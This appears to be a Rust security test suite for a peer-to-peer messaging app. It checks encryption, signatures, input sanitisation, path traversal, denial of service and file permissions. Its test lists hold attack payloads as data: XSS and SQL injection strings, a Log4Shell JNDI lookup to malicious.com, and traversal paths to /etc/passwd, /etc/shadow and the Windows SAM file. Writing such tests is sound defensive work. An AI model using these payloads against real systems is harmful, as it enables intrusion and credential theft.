#[cfg(test)]
mod security_tests {
    use shadowghost::prelude::*;
    use std::collections::HashMap;
    use std::sync::Arc;
    use tokio::sync::RwLock;

    mod common;
    use common::{init_test_logging, TestSetup};

    #[tokio::test]
    async fn test_crypto_key_uniqueness() {
        let num_keys = 1000;
        let mut public_keys = std::collections::HashSet::new();
        let mut private_keys = std::collections::HashSet::new();

        for _ in 0..num_keys {
            let crypto = CryptoManager::new().unwrap();
            let public_key = crypto.get_public_key();

            assert!(public_keys.insert(public_key.key_bytes.clone()));

            let test_data = b"test";
            let encrypted = crypto.encrypt(test_data).unwrap();
            assert!(private_keys.insert(encrypted));
        }

        assert_eq!(public_keys.len(), num_keys);
        assert_eq!(private_keys.len(), num_keys);
    }

    #[tokio::test]
    async fn test_crypto_tamper_resistance() {
        let crypto = CryptoManager::new().unwrap();
        let original_data = b"sensitive data that should not be tampered with";

        let encrypted = crypto.encrypt(original_data).unwrap();

        for i in 0..encrypted.len() {
            let mut tampered = encrypted.clone();
            tampered[i] = tampered[i].wrapping_add(1);

            let result = crypto.decrypt(&tampered);
            assert!(result.is_err());
        }

        let mut tampered_partial = encrypted.clone();
        tampered_partial.truncate(encrypted.len() - 1);
        assert!(crypto.decrypt(&tampered_partial).is_err());

        let mut tampered_extended = encrypted.clone();
        tampered_extended.push(0xFF);
        assert!(crypto.decrypt(&tampered_extended).is_err());
    }

    #[tokio::test]
    async fn test_signature_forgery_resistance() {
        let crypto1 = CryptoManager::new().unwrap();
        let crypto2 = CryptoManager::new().unwrap();

        let data = b"important message";
        let signature1 = crypto1.sign_data(data).unwrap();
        let public_key1 = crypto1.get_public_key();
        let public_key2 = crypto2.get_public_key();

        assert!(crypto1
            .verify_signature(data, &signature1, &public_key1)
            .unwrap());

        assert!(!crypto2
            .verify_signature(data, &signature1, &public_key2)
            .unwrap());
        assert!(!crypto1
            .verify_signature(data, &signature1, &public_key2)
            .unwrap());

        let different_data = b"tampered message";
        assert!(!crypto1
            .verify_signature(different_data, &signature1, &public_key1)
            .unwrap());

        for i in 0..signature1.len() {
            let mut tampered_signature = signature1.clone();
            tampered_signature[i] = tampered_signature[i].wrapping_add(1);

            assert!(!crypto1
                .verify_signature(data, &tampered_signature, &public_key1)
                .unwrap());
        }
    }

    #[tokio::test]
    async fn test_sg_link_injection_protection() {
        let peer = Peer::new("test_user".to_string(), "127.0.0.1:8080".to_string());
        let crypto = Arc::new(RwLock::new(CryptoManager::new().unwrap()));
        let event_bus = EventBus::new();
        let contact_manager = ContactManager::new(peer, crypto, event_bus);

        let malicious_links = vec![
            "sg://../../../../etc/passwd",
            "sg://<script>alert('xss')</script>",
            "sg://'; DROP TABLE contacts; --",
            "sg://\x00\x01\x02\x03invalid",
            "sg://very_long_string".to_string() + &"a".repeat(10000),
            "sg://invalid_json_payload",
            "sg://eyJtYWxpY2lvdXMiOiJ0cnVlIn0=", // {"malicious":"true"}
            "",
            "invalid_protocol://test",
            "sg://",
            "sg",
        ];

        for malicious_link in malicious_links {
            let result = contact_manager
                .add_contact_by_sg_link(&malicious_link)
                .await;
            assert!(
                result.is_err(),
                "Should reject malicious link: {}",
                malicious_link
            );
        }
    }

    #[tokio::test]
    async fn test_input_sanitization() {
        init_test_logging();

        let malicious_names = vec![
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "\x00\x01\x02\x03",
            "very_long_name".to_string() + &"x".repeat(1000),
            "",
            "../../etc/passwd",
            "${jndi:ldap://malicious.com/a}",
            "%00%01%02%03",
        ];

        for malicious_name in malicious_names {
            let test_id = format!("security_test_{}", uuid::Uuid::new_v4());
            let mut core = ShadowGhostCore::new_for_test(&test_id).unwrap();

            let result = core.initialize(Some(malicious_name.clone())).await;
            if result.is_ok() {
                let peer_info = core.get_peer_info().await;
                if let Some(info) = peer_info {
                    assert!(!info.contains("<script>"));
                    assert!(!info.contains("DROP TABLE"));
                    assert!(!info.contains("../../"));
                }
                core.shutdown().await.unwrap();
            }
        }
    }

    #[tokio::test]
    async fn test_file_path_traversal_protection() {
        let malicious_paths = vec![
            "../../etc/passwd",
            "../../../windows/system32/config/sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
            "\\\\malicious.com\\share\\file",
            "..\\..\\..\\..",
            "/dev/urandom",
            "/proc/self/mem",
            "con.txt", // Windows reserved name
            "prn.log", // Windows reserved name
        ];

        for malicious_path in malicious_paths {
            let path = std::path::PathBuf::from(&malicious_path);
            let result = std::panic::catch_unwind(|| {
                let _ = ConfigManager::new(&path);
            });

            if result.is_ok() {
                let temp_dir = std::env::temp_dir().join("security_test");
                let safe_path = temp_dir.join("safe_config.toml");
                std::fs::create_dir_all(&temp_dir).unwrap();

                let config_result = ConfigManager::new(&safe_path);
                assert!(config_result.is_ok());

                std::fs::remove_dir_all(&temp_dir).unwrap();
            }
        }
    }

    #[tokio::test]
    async fn test_denial_of_service_protection() {
        let peer = Peer::new("dos_test".to_string(), "127.0.0.1:8080".to_string());
        let crypto = Arc::new(RwLock::new(CryptoManager::new().unwrap()));
        let event_bus = EventBus::new();
        let contact_manager = ContactManager::new(peer, crypto, event_bus);

        let very_large_data = vec![0u8; 1024 * 1024 * 10]; // 10 MB
        let base64_large =
            base64::engine::general_purpose::URL_SAFE_NO_PAD.encode(&very_large_data);
        let large_sg_link = format!("sg://{}", base64_large);

        let start_time = std::time::Instant::now();
        let result = contact_manager.add_contact_by_sg_link(&large_sg_link).await;
        let elapsed = start_time.elapsed();

        assert!(result.is_err());
        assert!(elapsed < std::time::Duration::from_secs(5));
    }

    #[tokio::test]
    async fn test_memory_exhaustion_protection() {
        let crypto = CryptoManager::new().unwrap();

        for size in [1024, 10240, 102400, 1024000].iter() {
            let large_data = vec![0u8; *size];

            let start_time = std::time::Instant::now();
            let result = crypto.encrypt(&large_data);
            let elapsed = start_time.elapsed();

            if *size <= 1024000 {
                assert!(result.is_ok());
                assert!(elapsed < std::time::Duration::from_secs(10));

                if let Ok(encrypted) = result {
                    let decrypt_result = crypto.decrypt(&encrypted);
                    assert!(decrypt_result.is_ok());
                    assert_eq!(decrypt_result.unwrap(), large_data);
                }
            }
        }
    }

    #[tokio::test]
    async fn test_concurrent_access_safety() {
        use std::sync::atomic::{AtomicUsize, Ordering};

        let test_id = uuid::Uuid::new_v4().to_string();
        let core = Arc::new(tokio::sync::Mutex::new(
            ShadowGhostCore::new_for_test(&test_id).unwrap(),
        ));

        {
            let mut core_guard = core.lock().await;
            core_guard
                .initialize(Some("concurrent_test".to_string()))
                .await
                .unwrap();
            core_guard.start_server().await.unwrap();
        }

        let success_count = Arc::new(AtomicUsize::new(0));
        let error_count = Arc::new(AtomicUsize::new(0));

        let mut handles = vec![];

        for i in 0..50 {
            let core_clone = core.clone();
            let success_clone = success_count.clone();
            let error_clone = error_count.clone();

            let handle = tokio::spawn(async move {
                for j in 0..10 {
                    let operation = i % 4;

                    match operation {
                        0 => {
                            let core_guard = core_clone.lock().await;
                            if core_guard.get_peer_info().await.is_some() {
                                success_clone.fetch_add(1, Ordering::Relaxed);
                            } else {
                                error_clone.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                        1 => {
                            let core_guard = core_clone.lock().await;
                            if core_guard.get_contacts().await.is_ok() {
                                success_clone.fetch_add(1, Ordering::Relaxed);
                            } else {
                                error_clone.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                        2 => {
                            let core_guard = core_clone.lock().await;
                            if core_guard.generate_sg_link().await.is_ok() {
                                success_clone.fetch_add(1, Ordering::Relaxed);
                            } else {
                                error_clone.fetch_add(1, Ordering::Relaxed);
                            }
                        }
                        3 => {
                            let core_guard = core_clone.lock().await;
                            let _ = core_guard.get_server_status().await;
                            success_clone.fetch_add(1, Ordering::Relaxed);
                        }
                        _ => unreachable!(),
                    }

                    tokio::time::sleep(std::time::Duration::from_millis(1)).await;
                }
            });
            handles.push(handle);
        }

        for handle in handles {
            handle.await.unwrap();
        }

        let total_success = success_count.load(Ordering::Relaxed);
        let total_errors = error_count.load(Ordering::Relaxed);

        println!(
            "Concurrent access test: {} successes, {} errors",
            total_success, total_errors
        );
        assert!(total_success > total_errors);

        {
            let mut core_guard = core.lock().await;
            core_guard.shutdown().await.unwrap();
        }
    }

    #[tokio::test]
    async fn test_protocol_message_validation() {
        use shadowghost::protocol::*;

        let valid_message = ProtocolMessage::create_text_message(
            "sender".to_string(),
            "recipient".to_string(),
            "valid message".to_string(),
            "msg123".to_string(),
        );

        let serialized = valid_message.to_bytes().unwrap();

        for i in 0..serialized.len() {
            let mut corrupted = serialized.clone();
            corrupted[i] = corrupted[i].wrapping_add(1);

            let result = ProtocolMessage::from_bytes(&corrupted);
            if result.is_ok() {
                let msg = result.unwrap();
                assert_ne!(msg.header.sender_id, valid_message.header.sender_id);
            }
        }

        let truncated = &serialized[..serialized.len() / 2];
        assert!(ProtocolMessage::from_bytes(truncated).is_err());

        let invalid_json = b"invalid json data";
        assert!(ProtocolMessage::from_bytes(invalid_json).is_err());
    }

    #[tokio::test]
    async fn test_storage_permission_security() {
        let temp_dir = std::env::temp_dir().join("shadowghost_security_storage");
        let mut config = AppConfig::default();
        config.storage.data_dir = temp_dir.clone();

        let event_bus = EventBus::new();
        let storage_manager = StorageManager::new(config, event_bus).unwrap();

        let private_key_data = b"super_secret_private_key";
        storage_manager
            .save_private_key(private_key_data)
            .await
            .unwrap();

        let key_file = temp_dir.join("keys").join("private.key");
        assert!(key_file.exists());

        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let metadata = std::fs::metadata(&key_file).unwrap();
            let permissions = metadata.permissions();
            let mode = permissions.mode();

            assert_eq!(mode & 0o777, 0o600);
        }

        let loaded_key = storage_manager.load_private_key().await.unwrap();
        assert_eq!(loaded_key.unwrap(), private_key_data);

        std::fs::remove_dir_all(&temp_dir).unwrap();
    }

    #[tokio::test]
    async fn test_network_message_size_limits() {
        let peer = Peer::new("test_user".to_string(), "127.0.0.1:8080".to_string());
        let event_bus = EventBus::new();
        let network_manager = NetworkManager::new(peer, event_bus).unwrap();

        let contact = Contact {
            id: "test_contact".to_string(),
            name: "test_contact".to_string(),
            address: "127.0.0.1:8081".to_string(),
            status: ContactStatus::Online,
            trust_level: TrustLevel::Medium,
            last_seen: 1234567890,
        };

        let small_message = "Small message";
        let medium_message = "M".repeat(1000);
        let large_message = "L".repeat(100000);
        let huge_message = "H".repeat(10000000);

        for (size_name, message) in [
            ("small", small_message),
            ("medium", medium_message),
            ("large", large_message),
            ("huge", huge_message),
        ] {
            let start_time = std::time::Instant::now();
            let result = network_manager.send_chat_message(&contact, &message).await;
            let elapsed = start_time.elapsed();

            if message.len() > 1000000 {
                assert!(result.is_err() || elapsed > std::time::Duration::from_secs(5));
            }

            println!(
                "Message size {}: {} bytes, took {:?}",
                size_name,
                message.len(),
                elapsed
            );
        }
    }

    #[tokio::test]
    async fn test_configuration_validation_security() {
        let temp_dir = std::env::temp_dir().join("shadowghost_config_security");
        let config_path = temp_dir.join("security_config.toml");

        std::fs::create_dir_all(&temp_dir).unwrap();

        let mut config_manager = ConfigManager::new(&config_path).unwrap();

        let dangerous_configs = [
            ("", "empty_user"),
            ("/etc/passwd", "path_traversal"),
            ("../../../etc/shadow", "path_traversal2"),
            ("con.txt", "windows_reserved"),
            ("user\x00null", "null_byte"),
            (
                "very_long_user_name".to_string() + &"x".repeat(10000),
                "too_long",
            ),
        ];

        for (dangerous_name, test_name) in dangerous_configs.iter() {
            if dangerous_name.is_empty() {
                let issues = config_manager.validate_config().unwrap();
                if !issues.is_empty() {
                    println!("Validation correctly caught empty user name");
                }
            } else {
                let result = config_manager.set_user_name(dangerous_name.clone());
                if result.is_ok() {
                    let validation_issues = config_manager.validate_config().unwrap();
                    if dangerous_name.len() > 1000 || dangerous_name.contains('\x00') {
                        assert!(
                            !validation_issues.is_empty(),
                            "Should flag dangerous config: {}",
                            test_name
                        );
                    }
                }
            }
        }

        std::fs::remove_dir_all(&temp_dir).unwrap();
    }

    #[tokio::test]
    async fn test_contact_isolation() {
        init_test_logging();

        let setup1 = TestSetup::new("user1").await.unwrap();
        let setup2 = TestSetup::new("user2").await.unwrap();

        let sg_link1 = setup1.core.generate_sg_link().await.unwrap();
        setup2.core.add_contact_by_sg_link(&sg_link1).await.unwrap();

        let contacts_core2 = setup2.core.get_contacts().await.unwrap();
        let contacts_core1 = setup1.core.get_contacts().await.unwrap();

        assert_eq!(contacts_core2.len(), 1);
        assert_eq!(contacts_core1.len(), 0);

        assert_eq!(contacts_core2[0].name, "user1");

        setup1.shutdown().await.unwrap();
        setup2.shutdown().await.unwrap();
    }

    #[test]
    fn test_cryptographic_constants() {
        let crypto = CryptoManager::new().unwrap();
        let public_key = crypto.get_public_key();

        assert_eq!(public_key.key_bytes.len(), 32);

        let test_data = b"test";
        let hash = crypto.hash_data(test_data);
        assert_eq!(hash.len(), 32);

        let signature = crypto.sign_data(test_data).unwrap();
        assert!(signature.len() >= 64);
    }
}
